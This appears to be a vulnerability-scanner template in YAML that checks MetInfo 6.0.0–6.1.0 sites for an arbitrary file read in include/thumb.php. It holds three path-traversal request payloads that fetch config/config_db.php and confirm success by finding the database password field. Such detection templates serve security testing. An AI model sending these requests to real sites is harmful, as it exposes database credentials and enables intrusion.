name: metinfo_thumb.php_Local_File_Inclusion
transport: http
set: {}
detail:
  dock: app="MetInfo"
  product: MetInfo
  homepage: https://gobies.org/
  impact: <p>Leaking the source code, database configuration files, etc., caused the
    website to be extremely insecure.<br></p>
  description: MetInfo is a content management system developed using PHP and Mysql.
    The old_thumb.class.php file in MetInfo 6.0.0~6.1.0 has an arbitrary file reading
    vulnerability. Attackers can use vulnerabilities to read sensitive files on the
    website.
rules:
  r1:
    method: GET
    path: /include/thumb.php?dir=..././http/..././config/config_db.php
    follow_redirects: false
    expression: response.status == 200 && response.body.bcontains(b'<?php') && response.body.bcontains(b'con_db_pass')
  r2:
    method: GET
    path: /include/thumb.php?dir=http/.....///.....///config/config_db.php
    follow_redirects: false
    expression: response.status == 200 && response.body.bcontains(b'<?php') && response.body.bcontains(b'con_db_pass')
  r3:
    method: GET
    path: /include/thumb.php?dir=http\..\..\config\config_db.php
    follow_redirects: false
    expression: response.status == 200 && response.body.bcontains(b'<?php') && response.body.bcontains(b'con_db_pass')
expression: r1() || r2() || r3()
